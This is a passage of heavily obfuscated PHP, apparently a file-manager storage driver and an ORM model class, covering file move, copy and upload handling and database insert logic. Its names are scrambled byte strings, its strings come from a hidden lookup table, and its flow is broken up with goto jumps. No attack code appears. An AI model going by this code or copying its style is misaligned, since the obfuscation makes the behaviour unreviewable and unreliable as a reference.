$this->getPathOuter($A‘¤İ‘ŞÉè) : !1; } public function moveFile($bÛŠ²ŸçÜ, $BÁ¶¤Š‘¹, $AÀôö–àî• = REPEAT_REPLACE) { $F“„©­ÏÈˆ =& $_SERVER[ä°„ä°º]; $Cğê„Üšô = $this->parse($BÁ¶¤Š‘¹); $C£ÄÕÊÑ¾ã = $this->model->move($bÛŠ²ŸçÜ, $Cğê„Üšô[$F“„©­ÏÈˆ[393]], $AÀôö–àî•, $Cğê„Üšô[$F“„©­ÏÈˆ[76]]); return $C£ÄÕÊÑ¾ã ? $this->getPathOuter($C£ÄÕÊÑ¾ã) : !1; } public function copy($f»âó˜½‡•, $D§´»ˆ˜µ, $E¨Ê÷¦˜Ø = REPEAT_REPLACE) { $e”•ÜÔíßè = $this->parse($D§´»ˆ˜µ); $D¿ã½­Ù¯Â = $this->model->copy($f»âó˜½‡•, $e”•ÜÔíßè[$_SERVER[ä°„ä°º][393]], $E¨Ê÷¦˜Ø); return $D¿ã½­Ù¯Â ? $this->getPathOuter($D¿ã½­Ù¯Â) : !1; } public function moveSameAllow() { } public function move($cÔ‰ùø¦Ò‹, $cØÌ¼ô›ê , $d³§íß‘õ = REPEAT_REPLACE) { $cğµòèö…Í = $this->parse($cØÌ¼ô›ê ); $fÌô•Ê©´Ã = $this->model->move($cÔ‰ùø¦Ò‹, $cğµòèö…Í[$_SERVER[ä°„ä°º][393]], $d³§íß‘õ); return $fÌô•Ê©´Ã ? $this->getPathOuter($fÌô•Ê©´Ã) : !1; } public function remove($a½êâ‘¿Öò, $d‰²¿àé×® = true) { return $this->model->remove($a½êâ‘¿Öò, $d‰²¿àé×®); } public function rename($d„Ø¸•ÌÚ, $cÌ°ÛÀÅíÈ) { $c¿ßÆÕˆÀ = $this->model->rename($d„Ø¸•ÌÚ, $cÌ°ÛÀÅíÈ); return $c¿ßÆÕˆÀ ? $this->getPathOuter($d„Ø¸•ÌÚ) : $c¿ßÆÕˆÀ; } public function size($Açêö–õÅ°) { $eÓ†ãóØìê = $this->infoSimple($Açêö–õÅ°); return $eÓ†ãóØìê ? $eÓ†ãóØìê[$_SERVER[ä°„ä°º][78]] : 0; } public function infoSimple($E–Š„âìº‘) { return $this->model->sourceInfo($E–Š„âìº‘); } public function info($B„ºí×°ËŞ) { return $this->infoParse($B„ºí×°ËŞ); } public function infoAuth($c‚º“«¯â‚) { return $this->infoParse($c‚º“«¯â‚, !1, !0); } public function infoWithChildren($Aô¶Ö‡Ùª±) { return $this->infoParse($Aô¶Ö‡Ùª±, !0); } protected function infoParse($cãÇùµ—¶, $BæŒîîíİ = false, $BñÏóŒ®¡¦ = false) { if (!$BæŒîîíİ) { return $this->model->pathInfo($cãÇùµ—¶, $BñÏóŒ®¡¦); } return $this->model->pathInfoMore($cãÇùµ—¶); } public function infoFull($cÙ¦“ˆ­¬) { $eÑêÙÖ…Â =& $_SERVER[ä°„ä°º]; $F¾˜°†–£ = explode($eÑêÙÖ…Â[8], $cÙ¦“ˆ­¬); $C¯ÖÂñ˜¢ƒ = implode($eÑêÙÖ…Â[8], array_splice($F¾˜°†–£, 1)); return $this->model->pathInfoByPath($F¾˜°†–£[0], $C¯ÖÂñ˜¢ƒ); } public function hashSimple($aÁ˜¸¼·ô) { $a×Úã™ÂÆ =& $_SERVER[ä°„ä°º]; $A´‘¿Ø‘ = $this->infoWithChildren($aÁ˜¸¼·ô); return $A´‘¿Ø‘[$a×Úã™ÂÆ[164]][$a×Úã™ÂÆ[171]]; } public function hashMd5($fƒ½éÙ’Âê) { $AÃÄ³Ÿ°˜‘ =& $_SERVER[ä°„ä°º]; $eŠÁğ‚ = $this->infoWithChildren($fƒ½éÙ’Âê); return $eŠÁğ‚[$AÃÄ³Ÿ°˜‘[164]][$AÃÄ³Ÿ°˜‘[170]]; } public function exist($cöä¬µë–) { $C¦ˆ–§Ú½³ =& $_SERVER[ä°„ä°º]; $aØÄ½êÅí = $this->parse($cöä¬µë–); if (!$aØÄ½êÅí[$C¦ˆ–§Ú½³[76]]) { return $this->isFile($cöä¬µë–) || $this->isFolder($cöä¬µë–); } $Fö¬™­ô•Ÿ = array($C¦ˆ–§Ú½³[394] => $aØÄ½êÅí[$C¦ˆ–§Ú½³[393]], $C¦ˆ–§Ú½³[28] => $aØÄ½êÅí[$C¦ˆ–§Ú½³[76]]); $aìÜÅ©Ã×ò = $this->model->where($Fö¬™­ô•Ÿ)->find(); return $aìÜÅ©Ã×ò ? !0 : !1; } public function isFile($FÚàè²Ó») { $fÚ³©ÌŒÖ =& $_SERVER[ä°„ä°º]; $F®ó‹‡ªéÏ = $this->infoSimple($FÚàè²Ó»); return $F®ó‹‡ªéÏ && $F®ó‹‡ªéÏ[$fÚ³©ÌŒÖ[403]] == $fÚ³©ÌŒÖ[87] ? !1 : !0; } public function isFolder($D÷ˆ“ÖÓÖì) { $bƒÄÔ‡âÍÃ =& $_SERVER[ä°„ä°º]; $D”ñä¨‘Åç = $this->infoSimple($D÷ˆ“ÖÓÖì); return $D”ñä¨‘Åç && $D”ñä¨‘Åç[$bƒÄÔ‡âÍÃ[403]] == $bƒÄÔ‡âÍÃ[87] ? !0 : !1; } public function listPath($F„ßÕ™ê¥, $Dç‘ŠùÚ¾Û = false) { $Bğ–Ì›Ñİç =& $_SERVER[ä°„ä°º]; if ($F„ßÕ™ê¥ == $Bğ–Ì›Ñİç[33]) { return !1; } $fÎ†Òäéø§ = array($Bğ–Ì›Ñİç[394] => $F„ßÕ™ê¥); if ($Dç‘ŠùÚ¾Û) { return $this->model->listSource($fÎ†Òäéø§, -1); } return $this->model->listSource($fÎ†Òäéø§); } public function has($eµŞ­æ•»Ê, $Fà—Ğñ¦ = false, $D™À¸ìŒ×¥ = null) { $BÖë ¾ñ¨½ =& $_SERVER[ä°„ä°º]; $dİƒ¬‰Ÿ“‘ = $this->infoWithChildren($eµŞ­æ•»Ê); if ($Fà—Ğñ¦) { return array($BÖë ¾ñ¨½[204] => $dİƒ¬‰Ÿ“‘[$BÖë ¾ñ¨½[204]], $BÖë ¾ñ¨½[203] => $dİƒ¬‰Ÿ“‘[$BÖë ¾ñ¨½[203]]); } return $D™À¸ìŒ×¥ ? $dİƒ¬‰Ÿ“‘[$BÖë ¾ñ¨½[204]] : $dİƒ¬‰Ÿ“‘[$BÖë ¾ñ¨½[203]]; } public function listAll($dÃ×¤Ò®äĞ) { $bã›òø£Äê = IO::info($this->pathParse[$_SERVER[ä°„ä°º][76]]); if (!$bã›òø£Äê) { return array(); } return $this->model->listAll($dÃ×¤Ò®äĞ); } public function getContent($FÛŠÃŸÉ¥) { return $this->model->getContent($FÛŠÃŸÉ¥); } public function setContent($B™£Æó, $CÄÎŒÃÚ© = '') { return $this->model->setContent($B™£Æó, $CÄÎŒÃÚ©); } public function fileSubstr($aÒƒ•é££ì, $eÒá®´Ó²ã, $aØí‘áœØ) { return $this->model->fileSubstr($aÒƒ•é££ì, $eÒá®´Ó²ã, $aØí‘áœØ); } public function download($Eæ¬Ò‡ôæä, $Fˆ¶Ş‹ô® = '') { $C®¤à±Ÿ†» = get_path_father($Fˆ¶Ş‹ô®); $d§¢÷Ôİ ˆ = get_path_this($Fˆ¶Ş‹ô®); $cä¸×Ğ“µÏ = $this->model->fileInfoGet($Eæ¬Ò‡ôæä); $f»ï¶ØÔ¡í = IO::copy($cä¸×Ğ“µÏ[$_SERVER[ä°„ä°º][76]], $C®¤à±Ÿ†», !1, $d§¢÷Ôİ ˆ); return $f»ï¶ØÔ¡í; } public function setModifyTime($fÀ–§×Ó¶Ğ, $AÒíÜ…¢ë¼ = '') { $e‘Ò”Ù§™ =& $_SERVER[ä°„ä°º]; if (!$fÀ–§×Ó¶Ğ) { return; } $this->model->where(array($e‘Ò”Ù§™[410] => $fÀ–§×Ó¶Ğ))->save(array($e‘Ò”Ù§™[84] => $AÒíÜ…¢ë¼)); } public function upload($C’²‘‡ôáñ, $E¬øÏöÅÕá, $cë“¾ó„öã = false, $aÆ„¢œùë = REPEAT_REPLACE) { $Cê¨Ü…ËÔÁ =& $_SERVER[ä°„ä°º]; $f¬ôÕ¢éç‹ = $this->parse($C’²‘‡ôáñ); $e¾èâî¼Ò = $this->model->addFile($f¬ôÕ¢éç‹[$Cê¨Ü…ËÔÁ[393]], $E¬øÏöÅÕá, $f¬ôÕ¢éç‹[$Cê¨Ü…ËÔÁ[76]], $cë“¾ó„öã, $aÆ„¢œùë); return $this->getPathOuter($e¾èâî¼Ò); } public function uploadFileByID($Cö’¡àëÅä, $A°ÌìŒ´£›, $f‡ï¡Ğ±ö‘) { $fÍÉ‚Ô¯¨¶ =& $_SERVER[ä°„ä°º]; $F°ÇİË‘‚í = $this->parse($Cö’¡àëÅä); $AŸ¾×ÜÑ”´ = $this->model->addFileByFileID($F°ÇİË‘‚í[$fÍÉ‚Ô¯¨¶[393]], $A°ÌìŒ´£›, $F°ÇİË‘‚í[$fÍÉ‚Ô¯¨¶[76]], $f‡ï¡Ğ±ö‘); return $this->getPathOuter($AŸ¾×ÜÑ”´); } public function addFileByRemote($e¶»Û‘çÂ, $C¬â¤â³ï, $c±›ø¡ÅÈˆ = array(), $bÚë”Ï¸Ã = '', $B¶ôÀ¹æ”) { $fé£•¾µî¯ =& $_SERVER[ä°„ä°º]; $E§Ò¿¤Ÿ†¿ = $this->parse($e¶»Û‘çÂ); $bÚë”Ï¸Ã = empty($bÚë”Ï¸Ã) ? $E§Ò¿¤Ÿ†¿[$fé£•¾µî¯[76]] : $bÚë”Ï¸Ã; $D›»¿ÀõÁ‘ = $this->model->addFileByRemote($E§Ò¿¤Ÿ†¿[$fé£•¾µî¯[393]], $C¬â¤â³ï, $bÚë”Ï¸Ã, $c±›ø¡ÅÈˆ, $B¶ôÀ¹æ”); return $this->getPathOuter($D›»¿ÀõÁ‘); } public function uploadLink($DŞ˜İ‰Ìƒ, $BÄ²‚È©ò = 0) { $e·’Ö½§†° =& $_SERVER[ä°„ä°º]; $c„™Ğ«¿² = $this->parse($DŞ˜İ‰Ìƒ); $f… ²òæª› = _get($GLOBALS[$e·’Ö½§†°[7]], $e·’Ö½§†°[1229]); $B”½ÆÂêµŞ = _get($GLOBALS[$e·’Ö½§†°[7]], $e·’Ö½§†°[1230]); $DŞ˜İ‰Ìƒ = Model($e·’Ö½§†°[584])->createFileName($c„™Ğ«¿²[$e·’Ö½§†°[76]], $f… ²òæª›, $B”½ÆÂêµŞ); return IO::uploadLink($DŞ˜İ‰Ìƒ, $BÄ²‚È©ò); } public function fileNameAuto($e¥Õø¿Ï‚â, $dËÇÍ¬ÑÜ, $eˆÕòè‡À = REPEAT_REPLACE, $Eƒ‡‰Ã…† = false) { return $this->model->fileNameAuto($e¥Õø¿Ï‚â, $dËÇÍ¬ÑÜ, $eˆÕòè‡À, $Eƒ‡‰Ã…†); } public function fileNameExist($FÙƒ˜¸“÷, $D»İÇÑÅÏï) { return $this->model->fileNameExist($FÙƒ˜¸“÷, $D»İÇÑÅÏï); } protected function _fileOut($d‚âµ›¦ÒŞ, $EÔÅö®œí = false, $aØŸ÷ñÑ½ = false, $bƒË‰ó¹±Î = '', $BÀ ù·Úˆ = false) { goto fÀ‚ì´„¾ˆ; cõÂšïòÚ«: $B ó¹„ÙÀæ = $this->model->fileInfoGet($d‚âµ›¦ÒŞ); $bƒË‰ó¹±Î = $B ó¹„ÙÀæ[$aÚõÒ—Èé¡[170]] ? $B ó¹„ÙÀæ[$aÚõÒ—Èé¡[170]] : $bƒË‰ó¹±Î; $e˜ùëÖƒâ = isset($GLOBALS[$aÚõÒ—Èé¡[1232]]) ? $GLOBALS[$aÚõÒ—Èé¡[1232]] : $bÙÏÀĞÙ‚Ü[$aÚõÒ—Èé¡[28]]; goto d¿Î¦†¢; fÀ‚ì´„¾ˆ: $aÚõÒ—Èé¡ =& $_SERVER[ä°„ä°º]; $bÙÏÀĞÙ‚Ü = $this->model->sourceInfo($d‚âµ›¦ÒŞ); if ($bÙÏÀĞÙ‚Ü[$aÚõÒ—Èé¡[403]] == $aÚõÒ—Èé¡[87]) { header($aÚõÒ—Èé¡[1231]); die; } goto cõÂšïòÚ«; d¿Î¦†¢: if ($BÀ ù·Úˆ) { return IO::fileOutServer($B ó¹„ÙÀæ[$aÚõÒ—Èé¡[76]], $EÔÅö®œí, $e˜ùëÖƒâ, $bƒË‰ó¹±Î); } IO::fileOut($B ó¹„ÙÀæ[$aÚõÒ—Èé¡[76]], $EÔÅö®œí, $e˜ùëÖƒâ, $bƒË‰ó¹±Î); goto Dœ«‰¬”½Æ; Dœ«‰¬”½Æ: } public function fileOut($a¬à§“‹±®, $B ÕŞ¤ß’ = false, $F¤§Ó¤½áè = false, $CÌ‹ŒŒğ« = '') { $this->_fileOut($a¬à§“‹±®, $B ÕŞ¤ß’, $F¤§Ó¤½áè, $CÌ‹ŒŒğ«); } public function fileOutServer($d‰Ü©Ùó²á, $eñ¦ôÑƒøê = false, $B¼¾š¦ª¹‡ = false, $CØÆĞ¢›ˆ = '') { $this->_fileOut($d‰Ü©Ùó²á, $eñ¦ôÑƒøê, $B¼¾š¦ª¹‡, $CØÆĞ¢›ˆ, !0); } protected function _fileOutImage($d™ï–Ü‚ÎÍ, $c¯Êï¨¾ù– = 250) { goto Cœ¨²É·»; Cœ¨²É·»: $Dôä‚©¿ã¬ =& $_SERVER[ä°„ä°º]; $a‹–òÎ³Â = $this->model->pathInfo($d™ï–Ü‚ÎÍ); if ($a‹–òÎ³Â[$Dôä‚©¿ã¬[403]] == $Dôä‚©¿ã¬[87]) { show_json($Dôä‚©¿ã¬[1233] . $d™ï–Ü‚ÎÍ, !1); } goto B‘Û‹ß³; AÆš ÎÄó: $GLOBALS[$Dôä‚©¿ã¬[1232]] = $C»Ç¦§ƒ±[$Dôä‚©¿ã¬[28]]; $GLOBALS[$Dôä‚©¿ã¬[162]] = $C»Ç¦§ƒ±; IO::fileOutImage($C»Ç¦§ƒ±[$Dôä‚©¿ã¬[76]], $c¯Êï¨¾ù–); goto báŒ¼õÙƒŞ; B‘Û‹ß³: $C»Ç¦§ƒ± = $this->model->fileInfoGet($d™ï–Ü‚ÎÍ); $C»Ç¦§ƒ±[$Dôä‚©¿ã¬[28]] = $a‹–òÎ³Â[$Dôä‚©¿ã¬[28]]; $C»Ç¦§ƒ±[$Dôä‚©¿ã¬[163]] = $a‹–òÎ³Â[$Dôä‚©¿ã¬[163]]; goto AÆš ÎÄó; báŒ¼õÙƒŞ: } public function fileOutImage($A» ÷İÎ¢, $e±ƒ»ÏÅ“Ö = 250) { $this->_fileOutImage($A» ÷İÎ¢, $e±ƒ»ÏÅ“Ö); } public function fileOutImageServer($FÇ¤’àÅ¥, $f™„æÀâŒÂ = 250) { $this->_fileOutImage($FÇ¤’àÅ¥, $f™„æÀâŒÂ); } public function link($AÒè‹¸à, $Bä½ò‡Ôø = '') { $CÎ§‚‡ÄÉÖ = $this->model->fileInfoGet($AÒè‹¸à); return IO::link($CÎ§‚‡ÄÉÖ[$_SERVER[ä°„ä°º][76]], $Bä½ò‡Ôø); } protected function parse($b«”—…ñŠñ) { $e¿àÃã…ÓÙ =& $_SERVER[ä°„ä°º]; if (strstr($b«”—…ñŠñ, $e¿àÃã…ÓÙ[8]) === !1) { return array($e¿àÃã…ÓÙ[412] => intval($b«”—…ñŠñ), $e¿àÃã…ÓÙ[76] => $e¿àÃã…ÓÙ[33], $e¿àÃã…ÓÙ[1228] => array()); } $e½¡Àµ†„§ = explode($e¿àÃã…ÓÙ[8], trim($b«”—…ñŠñ, $e¿àÃã…ÓÙ[8])); if (count($e½¡Àµ†„§) < 2) { show_tips($b«”—…ñŠñ . $e¿àÃã…ÓÙ[1234]); } return array($e¿àÃã…ÓÙ[412] => intval($e½¡Àµ†„§[0]), $e¿àÃã…ÓÙ[76] => $e½¡Àµ†„§[1], $e¿àÃã…ÓÙ[1228] => array_slice($e½¡Àµ†„§, 1)); } } goto a‰ãÚ‚‚Ç; BÌ˜Ã¨¶ß: define($_SERVER[ä°„ä°º][240], 0); define($_SERVER[ä°„ä°º][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\x6f\162\144\145\x72", "\x61\154\x69\x61\x73", "\x68\141\166\x69\156\147", "\x67\x72\x6f\x75\160", "\154\157\143\x6b", "\144\151\163\x74\151\x6e\x63\x74", "\x61\165\x74\157", "\x66\x69\154\164\x65\x72", "\x76\x61\x6c\151\x64\x61\164\145", "\162\x65\x73\x75\x6c\164", "\x62\x69\156\144", "\x74\157\x6b\x65\156"); public function __construct($dÎÜæ“–…Î = '', $b¼áÅÕñ‚Û = '', $c”š·ÁÓß¯ = '') { $CÀÈœ“áÄ¡ =& $_SERVER[ä°„ä°º]; $this->_initialize(); if (!empty($dÎÜæ“–…Î)) { if (strpos($dÎÜæ“–…Î, $CÀÈœ“áÄ¡[95])) { list($this->dbName, $this->name) = explode($CÀÈœ“áÄ¡[95], $dÎÜæ“–…Î); } else { $this->name = $dÎÜæ“–…Î; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($b¼áÅÕñ‚Û)) { $this->tablePrefix = $CÀÈœ“áÄ¡[33]; } elseif ($CÀÈœ“áÄ¡[33] != $b¼áÅÕñ‚Û) { $this->tablePrefix = $b¼áÅÕñ‚Û; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($CÀÈœ“áÄ¡[242]); } $this->db(0, empty($this->connection) ? $c”š·ÁÓß¯ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $b¡¦É‘ç =& $_SERVER[ä°„ä°º]; if (empty($this->fields)) { if (think_config($b¡¦É‘ç[243])) { $e‰½ÜŠÌ… = $this->dbName ? $this->dbName : think_config($b¡¦É‘ç[244]); $bŒÜàõ²­º = think_var_cache($b¡¦É‘ç[245] . strtolower(get_path_this($e‰½ÜŠÌ…) . $b¡¦É‘ç[95] . $this->name)); if ($bŒÜàõ²­º) { $cš…¯Çğ¡ß = think_config($b¡¦É‘ç[246]); if (empty($cš…¯Çğ¡ß) || $bŒÜàõ²­º[$b¡¦É‘ç[247]] == $cš…¯Çğ¡ß) { $this->fields = $bŒÜàõ²­º; return; } } } $this->flush(); } } public function flush() { goto Aê‚£©åö; Aê‚£©åö: $E‰ØŒÕ¡½ˆ =& $_SERVER[ä°„ä°º]; $this->db->setModel($this->name); $AÒƒö½åÊô = $this->db->getFields($this->getTableName()); goto aĞƒ›Õ¤ëÓ; CĞ÷óÒ“‹: foreach ($AÒƒö½åÊô as $E“…†¨Ó· => $bØå”îÊ´Û) { $FÙ´á™ˆµÖ[$E“…†¨Ó·] = $bØå”îÊ´Û[$E‰ØŒÕ¡½ˆ[29]]; if ($bØå”îÊ´Û[$E‰ØŒÕ¡½ˆ[36]]) { $this->fields[$E‰ØŒÕ¡½ˆ[249]] = $E“…†¨Ó·; if ($bØå”îÊ´Û[$E‰ØŒÕ¡½ˆ[39]]) { $this->fields[$E‰ØŒÕ¡½ˆ[248]] = !0; } } } $this->fields[$E‰ØŒÕ¡½ˆ[250]] = $FÙ´á™ˆµÖ; if (think_config($E‰ØŒÕ¡½ˆ[246])) { $this->fields[$E‰ØŒÕ¡½ˆ[247]] = think_config($E‰ØŒÕ¡½ˆ[246]); } goto Aï¹©ã„é; aĞƒ›Õ¤ëÓ: if (!$AÒƒö½åÊô) { return !1; } $this->fields = array_keys($AÒƒö½åÊô); $this->fields[$E‰ØŒÕ¡½ˆ[248]] = !1; goto CĞ÷óÒ“‹; Aï¹©ã„é: if (think_config($E‰ØŒÕ¡½ˆ[243])) { $Dù’‹À© = $this->dbName ? $this->dbName : think_config($E‰ØŒÕ¡½ˆ[244]); think_var_cache($E‰ØŒÕ¡½ˆ[245] . strtolower(get_path_this($Dù’‹À©) . $E‰ØŒÕ¡½ˆ[95] . $this->name), $this->fields); } goto bÇÍîŠëÊ; bÇÍîŠëÊ: } public function switchModel($CÌ¬Û Üš, $B‡„“Ù±ë‰ = array()) { $BÈë÷‡Äêå =& $_SERVER[ä°„ä°º]; $BŒ‘Â©ªÒï = ucwords(strtolower($CÌ¬Û Üš)) . $BÈë÷‡Äêå[251]; if (!class_exists($BŒ‘Â©ªÒï)) { think_exception($BŒ‘Â©ªÒï . think_lang($BÈë÷‡Äêå[252])); } $this->_extModel = new $BŒ‘Â©ªÒï($this->name); if (!empty($B‡„“Ù±ë‰)) { foreach ($B‡„“Ù±ë‰ as $A¯ÖïöƒÀñ) { $this->_extModel->setProperty($A¯ÖïöƒÀñ, $this->{$A¯ÖïöƒÀñ}); } } return $this->_extModel; } public function __set($aŒ­Ùò•¸ø, $f´ˆ…Ğª±) { $this->data[$aŒ­Ùò•¸ø] = $f´ˆ…Ğª±; } public function __get($fÑµÌ…†Şœ) { return isset($this->data[$fÑµÌ…†Şœ]) ? $this->data[$fÑµÌ…†Şœ] : null; } public function __isset($fßˆ¬ª¶£) { return isset($this->data[$fßˆ¬ª¶£]); } public function __unset($C¯´†õ™ˆ) { unset($this->data[$C¯´†õ™ˆ]); } public function __call($cÈÌÔÒààÆ, $D·ß‚‘®×Ë) { $f¹àÂ«£Š =& $_SERVER[ä°„ä°º]; if (in_array(strtolower($cÈÌÔÒààÆ), $this->methods, !0)) { $this->options[strtolower($cÈÌÔÒààÆ)] = $D·ß‚‘®×Ë[0]; return $this; } elseif (in_array(strtolower($cÈÌÔÒààÆ), array($f¹àÂ«£Š[253], $f¹àÂ«£Š[254], $f¹àÂ«£Š[255], $f¹àÂ«£Š[256], $f¹àÂ«£Š[257]), !0)) { $aÚ¤º¾Ş¾± = isset($D·ß‚‘®×Ë[0]) ? $D·ß‚‘®×Ë[0] : $f¹àÂ«£Š[182]; $aÚ¤º¾Ş¾± = $this->db->parseKey($aÚ¤º¾Ş¾±); return $this->getField(strtoupper($cÈÌÔÒààÆ) . $f¹àÂ«£Š[258] . $aÚ¤º¾Ş¾± . $f¹àÂ«£Š[259] . $cÈÌÔÒààÆ, $f¹àÂ«£Š[253]); } elseif (strtolower(substr($cÈÌÔÒààÆ, 0, 5)) == $f¹àÂ«£Š[260]) { $aÚ¤º¾Ş¾± = think_parse_name(substr($cÈÌÔÒààÆ, 5)); $E£°ù¾×»ô[$aÚ¤º¾Ş¾±] = $D·ß‚‘®×Ë[0]; return $this->where($E£°ù¾×»ô)->find(); } elseif (strtolower(substr($cÈÌÔÒààÆ, 0, 10)) == $f¹àÂ«£Š[261]) { $Eø†³½ÆÉÛ = think_parse_name(substr($cÈÌÔÒààÆ, 10)); $E£°ù¾×»ô[$Eø†³½ÆÉÛ] = $D·ß‚‘®×Ë[0]; return $this->where($E£°ù¾×»ô)->getField($D·ß‚‘®×Ë[1]); } elseif (isset($this->_scope[$cÈÌÔÒààÆ])) { return $this->scope($cÈÌÔÒààÆ, $D·ß‚‘®×Ë[0]); } elseif (method_exists($this, $cÈÌÔÒààÆ)) { array_unshift($D·ß‚‘®×Ë, $cÈÌÔÒààÆ); return call_user_func_array(array($this, $f¹àÂ«£Š[262]), $D·ß‚‘®×Ë); } else { return call_user_func_array(array(parent, $cÈÌÔÒààÆ), $D·ß‚‘®×Ë); } } protected function call() { goto D ˜ƒ‘Ìƒ; BŒÉ¸„‹÷ö: $D£ø™ƒ’Ÿ = $FÏ‹”ÂÕâˆ; if (is_array($FÏ‹”ÂÕâˆ)) { $D£ø™ƒ’Ÿ = $FÏ‹”ÂÕâˆ[1]; $FÏ‹”ÂÕâˆ = $FÏ‹”ÂÕâˆ[0]; } $Fñ¶…“¢¤² = count($F«Ş©²Æàæ) - 1; goto cÖÃ‰ÚŠ¼î; c†÷šó’Û: $Câİ±˜½³Ü = call_user_func_array(array($this, $FÏ‹”ÂÕâˆ), $F«Ş©²Æàæ); if (method_exists($this, $C»µ‚ÀÄˆ[266])) { $DíèÒèš—Ñ = call_user_func_array(array($this, $C»µ‚ÀÄˆ[267]), array($D£ø™ƒ’Ÿ, $F«Ş©²Æàæ, $Câİ±˜½³Ü)); if ($DíèÒèš—Ñ) { return $DíèÒèš—Ñ; } } return $Câİ±˜½³Ü; goto b×å¦Ÿñ¶; D ˜ƒ‘Ìƒ: $C»µ‚ÀÄˆ =& $_SERVER[ä°„ä°º]; $F«Ş©²Æàæ = func_get_args(); $FÏ‹”ÂÕâˆ = array_shift($F«Ş©²Æàæ); goto BŒÉ¸„‹÷ö; cÖÃ‰ÚŠ¼î: if (isset($F«Ş©²Æàæ[$Fñ¶…“¢¤²]) && $F«Ş©²Æàæ[$Fñ¶…“¢¤²] === $FÏ‹”ÂÕâˆ) { think_exception(__CLASS__ . $C»µ‚ÀÄˆ[4] . $FÏ‹”ÂÕâˆ . think_lang($C»µ‚ÀÄˆ[263])); return; } $F«Ş©²Æàæ[] = $FÏ‹”ÂÕâˆ; if (method_exists($this, $C»µ‚ÀÄˆ[264])) { $DíèÒèš—Ñ = call_user_func_array(array($this, $C»µ‚ÀÄˆ[265]), array($D£ø™ƒ’Ÿ, $F«Ş©²Æàæ)); if (!is_null($DíèÒèš—Ñ) && $DíèÒèš—Ñ !== !1) { return $DíèÒèš—Ñ; } } goto c†÷šó’Û; b×å¦Ÿñ¶: } protected function _initialize() { } protected function _facade($cËÖÈË×º”) { $f®·³•İ´ò =& $_SERVER[ä°„ä°º]; if (!empty($this->fields)) { foreach ($cËÖÈË×º” as $f²š¨‰î¯ => $B“©µøó…½) { if (is_array($this->fields) && !in_array($f²š¨‰î¯, $this->fields, !0)) { unset($cËÖÈË×º”[$f²š¨‰î¯]); } elseif (is_scalar($B“©µøó…½)) { $this->_parseType($cËÖÈË×º”, $f²š¨‰î¯); } } } if (!empty($this->options[$f®·³•İ´ò[268]])) { $cËÖÈË×º” = array_map($this->options[$f®·³•İ´ò[268]], $cËÖÈË×º”); unset($this->options[$f®·³•İ´ò[268]]); } $this->_beforeWrite($cËÖÈË×º”); return $cËÖÈË×º”; } protected function _beforeWrite(&$CäÈÔ¯—‹¥) { } public function add($cÛ‰ÆËø…Í = '', $e¤”¡ìø” = array(), $aÉÆ›Öö¬² = false) { goto bÉ¥ßíÌ³Ğ; DÁ¯ğÔ®İë: return $f—¡Š³¦İ§; goto e©‰ªÇ¾áÖ; D¯ç†Á: if (!1 === $this->_beforeInsert($cÛ‰ÆËø…Í, $e¤”¡ìø”)) { return !1; } $f—¡Š³¦İ§ = $this->db->insert($cÛ‰ÆËø…Í, $e¤”¡ìø”, $aÉÆ›Öö¬²); if (!1 !== $f—¡Š³¦İ§) { $dÀÑÓŒ‡ = $this->getLastInsID(); if ($dÀÑÓŒ‡) { $cÛ‰ÆËø…Í[$this->getPk()] = $dÀÑÓŒ‡; $this->_after_insert($cÛ‰ÆËø…Í, $e¤”¡ìø”); return $dÀÑÓŒ‡; } $this->_after_insert($cÛ‰ÆËø…Í, $e¤”¡ìø”); } goto DÁ¯ğÔ®İë; bÉ¥ßíÌ³Ğ: if (empty($cÛ‰ÆËø…Í)) { if (!empty($this->data)) { $cÛ‰ÆËø…Í = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ä°„ä°º][269]); return !1; } } $e¤”¡ìø” = $this->_parseOptions($e¤”¡ìø”); $cÛ‰ÆËø…Í = $this->_facade($cÛ‰ÆËø…Í); goto D¯ç†Á; e©‰ªÇ¾áÖ: } protected function _beforeInsert(&$eá¨‹ ’é, $bÊÒœ¤Œõ) { } protected function _after_insert($cˆÒ×»¸ŞÀ, $D½Îíê¢†¤) { } public function addAll($e»£‹ùÁá£, $FİáÚãì‰™ = array(), $d±ó¶â¼„Œ = false) { goto Aé÷ØÕ’ãæ; BÑÎ˜²Ã‚ : foreach ($e»£‹ùÁá£ as $C­‹ÏÕ»‡µ => $FŒÖâ„Îà‡) { $e»£‹ùÁá£[$C­‹ÏÕ»‡µ] = $this->_facade($FŒÖâ„Îà‡); } if (method_exists($this->db, $fªïºÜíöï[270])) { $aÇŒ‚¨µ´ = $this->db->insertAll($e»£‹ùÁá£, $FİáÚãì‰™, $d±ó¶â¼„Œ); } else { $this->startTrans(); foreach ($e»£‹ùÁá£ as $C­‹ÏÕ»‡µ => $FŒÖâ„Îà‡) { $aÇŒ‚¨µ´ = $this->db->insert($FŒÖâ„Îà‡, $FİáÚãì‰™, $d±ó¶â¼„Œ); } $this->commit(); } if (!1 !== $aÇŒ‚¨µ´) { $bœ–Û¿ëäá = $this->getLastInsID(); if ($bœ–Û¿ëäá) { return $bœ–Û¿ëäá; } } goto Dßøˆï››Ÿ; Dßøˆï››Ÿ: return $aÇŒ‚¨µ´; goto fÙÙ±Š¯¶½; Aé÷ØÕ’ãæ: $fªïºÜíöï =& $_SERVER[ä°„ä°º]; if (empty($e»£‹ùÁá£)) { $this->error = think_lang($fªïºÜíöï[269]); return !1; } $FİáÚãì‰™ = $this->_parseOptions($FİáÚãì‰™); goto BÑÎ˜²Ã‚ ; fÙÙ±Š¯¶½: } public function selectAdd($c˜æİù… = '', $c›¸Ç™òÍÂ = '', $E³ÑĞô©òÜ = array()) { $BØÍ‹¤­ù¨ =& $_SERVER[ä°„ä°º]; $E³ÑĞô©òÜ = $this->_parseOptions($E³ÑĞô©òÜ); if (!1 === ($eèÂ¸İ—‡ò = $this->db->selectInsert($c˜æİù… ? $c˜æİù… : $E³ÑĞô©òÜ[$BØÍ‹¤­ù¨[271]], 